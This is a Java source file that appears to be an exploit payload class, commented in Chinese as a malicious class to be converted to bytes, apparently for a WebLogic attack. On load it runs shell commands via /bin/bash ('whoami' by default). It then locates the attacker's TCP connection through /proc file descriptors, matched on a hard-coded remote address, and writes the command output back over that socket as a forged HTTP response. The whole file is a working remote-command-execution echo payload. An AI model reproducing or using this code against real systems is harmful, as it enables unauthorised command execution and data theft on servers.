package com.firebasky.echo.controller;

import java.io.*;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

// 将被转换成字节的恶意类
// 调用 com.weblogic.exp.XmlExp.say("id")
public class socket_v2 {
    public socket_v2() throws Exception {
        say("whoami");
    }

    public static String getInode() throws IOException {
        File f1 = new File("/proc/thread-self/net/tcp");
        BufferedReader br = new BufferedReader(new FileReader(f1));
        String line, inode = "";

        String result = "";
        while ((line = br.readLine()) != null) {
            String[] lineArr = line.split("\\s+");
            String remoteAddr = lineArr[3];

            result += line + "\n";
            // 按源IP/PORT过滤，在各层转发中会变，这个方法不准
            //https://tool.520101.com/wangluo/jinzhizhuanhuan/
            if (remoteAddr.contains("1748878")) {
                inode = lineArr[10];
                if (!inode.equals("0")) {
                    break;
                }
            }
        }
        return inode;
    }

    public static Boolean isClass(String className) {
        try {
            Class.forName(className);
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }

    public static FileDescriptor getFd(File file) throws Exception {
        Class clazz = Class.forName("java.io.FileDescriptor");
        Constructor m = clazz.getDeclaredConstructor(new Class[]{Integer.TYPE});
        m.setAccessible(true);

        String[] fdArr = file.toString().split("/");
        String fdId = fdArr[fdArr.length - 1];
        FileDescriptor fd = (FileDescriptor) m.newInstance(new Object[]{new Integer(fdId)});
        return fd;
    }

    public static File getFdFile(String inode) throws Exception {
        String tmp = "";
        if (isClass("java.nio.file.Path")) {
            File file = new File("/proc/thread-self/fd");
            File[] fs = file.listFiles();

            for (File f : fs) {
                Path path = Paths.get(f.toString(), new String[]{""});
                String link = Files.readSymbolicLink(path).toString();

                if (link.contains(inode)) {
                    return f;
                }
            }
        } else {
            File file = new File("/proc");
            File[] fs = file.listFiles();

            for (File f1 : fs) {
                if (!f1.isDirectory()) continue;
                if (!f1.canRead()) continue;
                if (!f1.getPath().matches("/proc/[0-9]+")) continue;

                File f2 = new File(f1.getPath() + "/fd/");
                for (File f3 : f2.listFiles()) {
                    if (!f3.exists()) continue;
                    if (f3.isDirectory()) continue;
                    if (!f3.canWrite()) continue;
                    String id = f3.getName();
                    if (id == null || id.length() == 0) continue;
                    try {
                        if (Long.parseLong(id) < 3) continue;
                    } catch (Exception e) {
                        continue;
                    }
                    String cmd = "readlink " + f3.getPath();
                    BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd}).getInputStream()));
                    String line = br.readLine();
                    if (line.contains(inode)) {
                        return f3;
                    }
                }
            }
        }

        return new File(tmp);
    }

    public static void writeFd(FileDescriptor fd, String body) throws Exception {
        String response = "HTTP/1.1 200 OK\r\n"
                + "Content-Type: text/html\r\n"
                + "Content-Length: " + body.length()
                + "\r\n\r\n"
                + body
                + "\r\n\r\n";

        FileOutputStream os = new FileOutputStream(fd);
        os.write(response.getBytes());
    }

    public static String ShellExec(String command) throws IOException {

        List<String> cmds = new ArrayList<String>();
        cmds.add("/bin/bash");
        cmds.add("-c");
        cmds.add(command);
        ProcessBuilder pb = new ProcessBuilder(cmds);
        pb.redirectErrorStream(true);
        Process proc = pb.start();

        byte[] out = new byte[1024 * 10];
        proc.getInputStream().read(out);
        return new String(out);
    }

    public static void say(String cmd) throws Exception {
        String response = ShellExec(cmd);

        String inode = getInode();
        File file = getFdFile(inode);
        FileDescriptor fd = getFd(file);
        writeFd(fd, response);
    }
}

